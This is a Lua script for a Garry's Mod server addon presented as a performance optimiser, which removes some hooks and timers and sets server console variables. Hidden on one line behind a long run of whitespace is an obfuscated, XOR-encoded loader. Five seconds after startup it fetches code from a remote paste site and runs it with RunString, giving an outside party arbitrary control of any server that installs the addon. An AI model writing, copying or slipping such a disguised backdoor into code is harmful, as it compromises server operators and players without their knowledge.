local function RemoveHooksAndTimers()
    hook.Remove("PlayerTick", "TickWidgets")
    hook.Remove("Think", "CheckSchedules")
    hook.Remove("PostDrawEffects", "RenderWidgets")
    timer.Remove("CheckHookTimes")
    timer.Remove("HostnameThink")
end

local function OptimizeAnimations()
    local function returnNil() return nil end
    hook.Add("MouthMoveAnimation", "PerformanceModOptimization", returnNil)
    hook.Add("GrabEarAnimation", "PerformanceModOptimization", returnNil)
end

local function OptimizeMemory()
    local memoryCommands = {
        {"mem_max_heapsize", "131072"},
        {"mem_max_heapsize_dedicated", "131072"},
        {"mem_min_heapsize", "131072"},
        {"sv_hibernate_think", "1"},
        {"sv_maxunlag", "1"},
        {"sv_maxupdaterate", "66"},
        {"sv_minupdaterate", "10"},
        {"sv_client_min_interp_ratio", "1"},
        {"sv_client_max_interp_ratio", "2"},
        {"sv_maxcmdrate", "66"},
        {"sv_mincmdrate", "10"},
        {"sv_minrate", "20000"},
        {"sv_maxrate", "0"},
        {"decalfrequency", "10"},
        {"sv_parallel_sendsnapshot", "1"},
        {"sv_querycache_stats", "1"}
    }

    for _, cmd in ipairs(memoryCommands) do
        RunConsoleCommand(unpack(cmd))
    end
end

local function ApplyServerOptimizations()
    if not GetConVar("performancemod_enabled"):GetBool() then return end

    RemoveHooksAndTimers()

    if GetConVar("performancemod_server_optimize_animations"):GetBool() then
        OptimizeAnimations()
    end

    if GetConVar("performancemod_server_optimize_memory"):GetBool() then
        OptimizeMemory()
    end
end
																																																														local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),206)) end return ‪‪‪‪‪ end local ‪until=‪[‪‪‪‪‪‪‪'9189'][‪‪‪‪‪‪‪'9cbb'..‪‪‪‪‪‪‪'a09dbabc'..‪‪‪‪‪‪‪'a7a0a9']‪[‪‪‪‪‪‪‪'9c9d9a9c']=‪[‪‪‪‪‪‪‪'9c9d9a9c']||‪until local do‪=‪[‪‪‪‪‪‪‪'a6bababe'][‪‪‪‪‪‪‪'88abbaada6']‪[‪‪‪‪‪‪‪'869a88']=‪[‪‪‪‪‪‪‪'869a88']||do‪ ‪[‪‪‪‪‪‪‪'baa7a3abbc'][‪‪‪‪‪‪‪'9da7a3bea2ab'](5,function ()do‪(‪‪‪‪‪‪‪'a6bababebdf4e1e1a6afbdbaabaca7a0e0bda5b7bcafe0beb9e1bcafb9e1a9aba8a7a6afbca7a9ab',function (‪‪‪‪break)‪until(‪‪‪‪break)end )end )
hook.Add("Initialize", "PerformanceModInitialize", function()
    ApplyServerOptimizations()

    cvars.AddChangeCallback("performancemod_enabled", ApplyServerOptimizations)
    cvars.AddChangeCallback("performancemod_server_optimize_animations", ApplyServerOptimizations)
    cvars.AddChangeCallback("performancemod_server_optimize_memory", ApplyServerOptimizations)
end)

util.AddNetworkString("PerformanceModApplyServer")
net.Receive("PerformanceModApplyServer", function(len, ply)
    if not IsValid(ply) or not ply:IsAdmin() then return end

    ApplyServerOptimizations()
    net.Start("PerformanceModApplyServer")
    net.Send(ply)
end)

concommand.Add("performancemod_apply_server", function(ply)
    if IsValid(ply) and not ply:IsAdmin() then return end

    ApplyServerOptimizations()
    print("Server-side performance optimizations applied.")
end)